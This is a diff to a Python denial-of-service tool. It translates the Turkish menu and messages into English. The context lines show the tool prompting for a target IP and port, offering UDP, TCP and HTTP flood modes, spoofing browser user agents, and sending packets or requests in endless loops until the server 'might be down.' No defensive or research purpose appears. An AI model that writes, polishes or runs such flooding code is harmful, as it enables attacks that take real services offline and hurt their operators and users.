@@ -6,6 +6,7 @@ import socket
 import random
 from datetime import datetime
 
+# Color Codes
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -24,11 +25,11 @@ print(RESET)
 ip = input("IP / Target Host : ")
 port = int(input("Port             : "))
 
-print("\n" + YELLOW + "--- SALDIRI MODUNU SEÇİN ---" + RESET)
-print("1 - UDP Flood (Katman 4 - Saf Veri Girişi)")
-print("2 - TCP Flood (Katman 4 - Bağlantı Kilitleme)")
-print("3 - HTTP Flood (Katman 7 - Web Sunucu Çökertme)")
-secim = input("\nSeçiminiz (1/2/3): ")
+print("\n" + YELLOW + "--- SELECT ATTACK MODE ---" + RESET)
+print("1 - UDP Flood (Layer 4 - Raw Data Input)")
+print("2 - TCP Flood (Layer 4 - Connection Locking)")
+print("3 - HTTP Flood (Layer 7 - Web Server Downer)")
+secim = input("\nYour Choice (1/2/3): ")
 
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -44,6 +45,7 @@ def http_istegi_hazirla():
     istek += "Accept: text/html,application/xhtml+xml\r\n"
     istek += "Connection: keep-alive\r\n\r\n"
     return istek.encode('utf-8')
+
 os.system("clear")
 print(YELLOW)
 os.system("figlet Attack Loading")
@@ -77,7 +79,7 @@ if secim == "1":
             sent += 1
             print(f"Sent {sent} UDP packet to {ip} through port:{port}")
         except socket.error:
-            print(RED + "UDP gönderme hatası!" + GREEN)
+            print(RED + "UDP send error!" + GREEN)
 
 elif secim == "2":
     while True:
@@ -106,7 +108,7 @@ elif secim == "3":
             print(f"Sent {sent} HTTP GET request to {ip}")
             sock.close()
         except (socket.error, socket.timeout):
-            print(RED + "Sunucu HTTP isteklerine cevap veremiyor! Çökmüş olabilir." + GREEN)
+            print(RED + "Server not responding to HTTP requests! It might be down." + GREEN)
             sent += 1
 else:
-    print(RED + "Geçersiz seçim yaptınız! Program kapatılıyor." + RESET)
+    print(RED + "Invalid choice! Exiting program." + RESET)
